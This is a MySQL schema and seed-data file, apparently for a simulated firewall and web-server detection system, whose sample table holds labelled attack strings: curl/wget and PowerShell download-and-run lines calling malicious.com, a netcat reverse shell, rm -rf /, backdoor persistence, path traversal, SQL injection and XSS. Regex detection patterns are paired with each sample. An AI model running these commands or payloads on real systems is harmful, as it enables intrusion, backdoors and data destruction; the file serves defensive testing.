-- Virtual Firewall
-- Virtual Firewall
-- Virtual Firewall
CREATE TABLE `ip_states` (
    `id` bigint NOT NULL AUTO_INCREMENT,
    `ip` varchar(255) NOT NULL,
    `is_blocked` bit(1) NOT NULL,
    PRIMARY KEY (`id`),
    UNIQUE KEY `UKfda0ic5qpxw5xia77s159riwy` (`ip`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

CREATE TABLE `firewall_logs` (
    `id` bigint NOT NULL AUTO_INCREMENT,
    `created_at` datetime(6) NOT NULL,
    `ip` varchar(255) NOT NULL,
    `organizer` enum('BENIGN','PORTSCAN','RECONNAISSANCE','WEB_ATTACK_BRUTE_FORCE','WEB_ATTACK_XSS','WEB_ATTACK_SQL_INJECTION','HEARTBLEED','EXPLOITS','FUZZERS','FTP_PATATOR','SSH_PATATOR','BACKDOOR','BOT','SHELLCODE','WORMS','INFILTRATION','DOS_SLOWHTTPTEST','DDOS','DOS','DOS_GOLDENEYE','DOS_HULK','DOS_SLOWLORIS','GENERIC','ANALYSIS','OBSERVING_SYSTEM') NOT NULL,
    `status` enum('BLOCK','UNBLOCK') NOT NULL,
    PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- Virtual Web Server
-- Virtual Web Server
-- Virtual Web Server
CREATE TABLE `pipelines` (
    `id` bigint NOT NULL AUTO_INCREMENT,
    `regex` varchar(255) NOT NULL,
    PRIMARY KEY (`id`),
    UNIQUE KEY `UKdfpsjwwt09nkc0d2uohu8p9cm` (`regex`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

CREATE TABLE `web_server_logs` (
    `id` bigint NOT NULL AUTO_INCREMENT,
    `created_at` datetime(6) NOT NULL,
    `organizer` enum('WEB_ATTACK_XSS','WEB_ATTACK_SQL_INJECTION','EXPLOITS','BACKDOOR','SHELLCODE','INFILTRATION','GENERIC','OBSERVING_SYSTEM') NOT NULL,
    `regex` varchar(255) NOT NULL,
    `status` enum('CREATE','UPDATE','DELETE') NOT NULL,
    PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- Virtual Web Application Server
-- Virtual Web Application Server
-- Virtual Web Application Server
CREATE TABLE `users` (
    `id` bigint NOT NULL AUTO_INCREMENT,
    `area` enum('OS','WEB') NOT NULL,
    `is_blocked` bit(1) NOT NULL,
    `username` varchar(255) NOT NULL,
    PRIMARY KEY (`id`),
    UNIQUE KEY `UKr43af9ap4edm43mmtq01oddj6` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

CREATE TABLE `web_application_server_logs` (
    `id` bigint NOT NULL AUTO_INCREMENT,
    `area` enum('OS','WEB') NOT NULL,
    `created_at` datetime(6) NOT NULL,
    `organizer` enum('WEB_ATTACK_BRUTE_FORCE','FTP_PATATOR','SSH_PATATOR','OBSERVING_SYSTEM') NOT NULL,
    `status` enum('BLOCK','UNBLOCK') NOT NULL,
    `username` varchar(255) NOT NULL,
    PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- Dummy Table
-- Dummy Table
-- Dummy Table
CREATE TABLE dummy_users (
    `id` INT AUTO_INCREMENT PRIMARY KEY,
    `username` VARCHAR(255) NOT NULL,
    `password` VARCHAR(255) NOT NULL,
    `type` ENUM('WEB_ATTACK_BRUTE_FORCE', 'FTP_PATATOR', 'SSH_PATATOR') NOT NULL,
    UNIQUE KEY `UKd9fpsjwwt0dnkc02muohu8p9c` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=45 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

CREATE TABLE `dummy_scripts` (
    `id` bigint NOT NULL AUTO_INCREMENT,
    `content` varchar(1000) NOT NULL,
    `type` enum('BENIGN','PORTSCAN','RECONNAISSANCE','WEB_ATTACK_BRUTE_FORCE','WEB_ATTACK_XSS','WEB_ATTACK_SQL_INJECTION','HEARTBLEED','EXPLOITS','FUZZERS','FTP_PATATOR','SSH_PATATOR','BACKDOOR','BOT','SHELLCODE','WORMS','INFILTRATION','DOS_SLOWHTTPTEST','DDOS','DOS','DOS_GOLDENEYE','DOS_HULK','DOS_SLOWLORIS','GENERIC','ANALYSIS') NOT NULL,
    PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=37 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

CREATE TABLE `regexes` (
    `id` bigint NOT NULL AUTO_INCREMENT,
    `content` varchar(255) NOT NULL,
    PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=34 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

CREATE TABLE `dummy_script_regexes` (
    `id` bigint NOT NULL AUTO_INCREMENT,
    `dummy_script_id` bigint NOT NULL,
    `regex_id` bigint NOT NULL,
    PRIMARY KEY (`id`),
    KEY `FKniqjtjvpacmsv1bipryuhcslg` (`dummy_script_id`),
    KEY `FKriq2016yu69eiqy2uiy9mdvkm` (`regex_id`),
    CONSTRAINT `FKniqjtjvpacmsv1bipryuhcslg` FOREIGN KEY (`dummy_script_id`) REFERENCES `dummy_scripts` (`id`),
    CONSTRAINT `FKriq2016yu69eiqy2uiy9mdvkm` FOREIGN KEY (`regex_id`) REFERENCES `regexes` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=45 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- Insert
-- Insert
-- Insert

INSERT INTO mlac.dummy_scripts (content,`type`) VALUES
    ('; curl http://malicious.com/backdoor.sh | sh','BACKDOOR'),
    ('; powershell -Exec Bypass -Command Invoke-WebRequest http://malicious.com/backdoor.ps1 -OutFile C:\\temp\\backdoor.ps1; C:\\temp\\backdoor.ps1','BACKDOOR'),
    ('../etc/passwd','EXPLOITS'),
    ('../../etc/shadow','EXPLOITS'),
    ('; shutdown -h now','EXPLOITS'),
    ('; rm -rf /;','EXPLOITS'),
    ('; exec xp_cmdshell(''net user malicious password /add'');','EXPLOITS'),
    ('; systemctl stop firewalld; systemctl disable firewalld','INFILTRATION'),
    ('; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False; Set-ExecutionPolicy Unrestricted -Force; IEX (New-Object Net.WebClient).DownloadString(''http://malicious.com/backdoor.ps1'')','INFILTRATION'),
    ('; Set-ItemProperty -Path ''HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings'' -Name ProxyServer -Value $proxyUrl; Set-ItemProperty -Path ''HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings'' -Name ProxyEnable -Value 1','INFILTRATION'),
    ('; echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf > /dev/null','INFILTRATION'),
    ('; wget http://malicious.com/backdoor.sh -O /tmp/backdoor.sh; chmod +x /tmp/backdoor.sh; /tmp/backdoor.sh','INFILTRATION'),
    ('; nmap -p 1-65535 -T4 -A -v','INFILTRATION'),
    ('; install -d /etc/systemd/system/; echo ''[Service]\nExecStart=/bin/bash /tmp/backdoor.sh\n[Install]\nWantedBy=multi-user.target'' > /etc/systemd/system/backdoor.service; systemctl enable backdoor.service; systemctl start backdoor.service','INFILTRATION'),
    ('; export http_proxy="http://malicious-proxy.com:8080"; export https_proxy="http://malicious-proxy.com:8080"; echo "http_proxy=http://malicious-proxy.com:8080" | sudo tee -a /etc/environment; echo "https_proxy=http://malicious-proxy.com:8080" | sudo tee -a /etc/environment','INFILTRATION'),
    ('#!/bin/sh target_ip=''192.168.1.1'' target_port=''4444'' nc $target_ip $target_port -e /bin/sh','SHELLCODE'),
    ('#!/bin/sh echo ''Collecting system information...'' username=$(whoami) echo ''Current user: $username'' network_config=$(ifconfig) echo ''Network configuration: $network_config'' running_processes=$(ps -aux) echo ''Running processes: $running_processes''','SHELLCODE'),
    ('#!/bin/sh file_url=''http://example.com/malware.sh'' local_path=''tmp/malware.sh'' echo ''Downloading file...'' curl -o $local_path $file_url echo ''Executing file...'' sh $local_path','SHELLCODE'),
    ('#!/bin/bash directory_path=''path/to/directory'' action=''destroy'' for file in $directory_path/*; do if [ ''$action'' = ''destroy'' ]; then echo ''Deleting $file...'' rm $file elif [ ''$action'' = ''encrypt'' ]; then echo ''Encrypting $file...'' fi done','SHELLCODE'),
    ('#!/bin/bash backdoor_path=''tmp/backdoor.sh'' echo ''Copying backdoor...'' cp /path/to/backdoor.sh $backdoor_path echo ''Setting backdoor to execute at system startup...'' (crontab -l 2>/dev/null; echo ''@reboot sh $backdoor_path'') | crontab -','SHELLCODE'),
    (''' OR ''1''=''1'' -- ','WEB_ATTACK_SQL_INJECTION'),
    (''' OR ''dsksl''=''dsksl'' --','WEB_ATTACK_SQL_INJECTION'),
    (''' UNION SELECT ''admin'', ''password'' FROM users WHERE ''user'' = ''admin'' -- ','WEB_ATTACK_SQL_INJECTION'),
    (''' UNION SELECT name FROM sys.tables -- ','WEB_ATTACK_SQL_INJECTION'),
    (''' UNION SELECT username, password FROM users -- ','WEB_ATTACK_SQL_INJECTION'),
    ('''; DROP TABLE users; -- ','WEB_ATTACK_SQL_INJECTION'),
    (''' UNION SELECT * FROM confidential_data; --','WEB_ATTACK_SQL_INJECTION'),
    ('<script>alert(''XSS'');</script>','WEB_ATTACK_XSS'),
    ('<script>document.location=''http://malicious.example.com'';</script>','WEB_ATTACK_XSS'),
    ('<img src=''invalid'' onerror=''alert("XSS");''>','WEB_ATTACK_XSS'),
    ('<img src=x onerror=''alert(''XSS'');''>','WEB_ATTACK_XSS'),
    ('<button onclick=''alert("XSS");''>Click Me!</button>','WEB_ATTACK_XSS'),
    ('javascript:alert(''XSS'');','WEB_ATTACK_XSS'),
    ('http://malicious.example.com#<script>alert(''XSS'');</script>','WEB_ATTACK_XSS'),
    ('<audio src=''malicious.mp3'' controls onplay=''alert("XSS");''></audio>','WEB_ATTACK_XSS'),
    ('<video><source onerror=''alert("XSS");''></video>','WEB_ATTACK_XSS');

INSERT INTO mlac.regexes (content) VALUES
    ('\\bcurl\\b'),
    ('\\bpowershell\\b'),
    ('^\\.\\./'),
    ('\\bshutdown\\b'),
    ('\\brm\\b'),
    ('\\bexec\\b'),
    ('\\bsystemctl\\b'),
    ('\\bSet-NetFirewallProfile\\b'),
    ('\\bSet-ExecutionPolicy\\b'),
    ('\\bIEX\\b'),
    ('\\bSet-ItemProperty\\b'),
    ('\\bGet-NetAdapter\\b'),
    ('\\bSet-DnsClientServerAddress\\b'),
    ('\\becho\\b'),
    ('\\bwget\\b'),
    ('\\bnmap\\b'),
    ('\\binstall\\b'),
    ('\\bexport\\b'),
    ('#!\\/bin\\/sh'),
    ('#!\\/bin\\/bash'),
    ('''\\s*OR\\s*''(.*)''\\s*=\\s*''\\1'''),
    ('UNION\\s+(ALL\\s+)?SELECT'),
    ('SELECT\\s+.+\\s+FROM\\s+sys\\.'),
    ('(DROP\\s+TABLE|DELETE\\s+FROM)'),
    ('.*<script[^>]*>.*?</script>'),
    ('.*<iframe[^>]*\\s(onmouseover|onclick|onerror|onload)=[''"][^''"]*[''"][^>]*>'),
    ('.*<img[^>]*\\s(onmouseover|onclick|onerror|onload)\\s*=\\s*[''"][^''"]*[''"][^>]*>'),
    ('.*<div[^>]*\\s(onmouseover|onclick|onerror|onload)=[''"][^''"]*[''"][^>]*>'),
    ('.*<button[^>]*\\s(onmouseover|onclick|onerror|onload)=[''"][^''"]*[''"][^>]*>'),
    ('.*<video[^>]*\\s(onmouseover|onclick|onerror|onload)=[''"][^''"]*[''"][^>]*>'),
    ('.*<audio[^>]*\\s(onplay|onerror|onended|onloadeddata|oncanplay)=[''"][^''"]*[''"][^>]*>'),
    ('.*<source[^>]*\\s(onerror)=[''"][^''"]*[''"][^>]*>'),
    ('.*javascript:[^;]*');

INSERT INTO mlac.dummy_script_regexes (dummy_script_id,regex_id) VALUES
    (1,1),
    (2,2),
    (3,3),
    (4,3),
    (5,4),
    (6,5),
    (7,6),
    (8,7),
    (9,8),
    (9,9),
    (9,10),
    (10,11),
    (10,12),
    (10,13),
    (11,14),
    (12,15),
    (13,16),
    (14,7),
    (14,14),
    (14,17),
    (15,14),
    (15,18),
    (16,19),
    (17,19),
    (18,19),
    (19,20),
    (20,20),
    (21,21),
    (22,21),
    (23,22),
    (24,22),
    (24,23),
    (25,22),
    (26,24),
    (27,22),
    (28,25),
    (29,25),
    (30,27),
    (31,27),
    (32,29),
    (33,33),
    (34,25),
    (35,31),
    (36,31);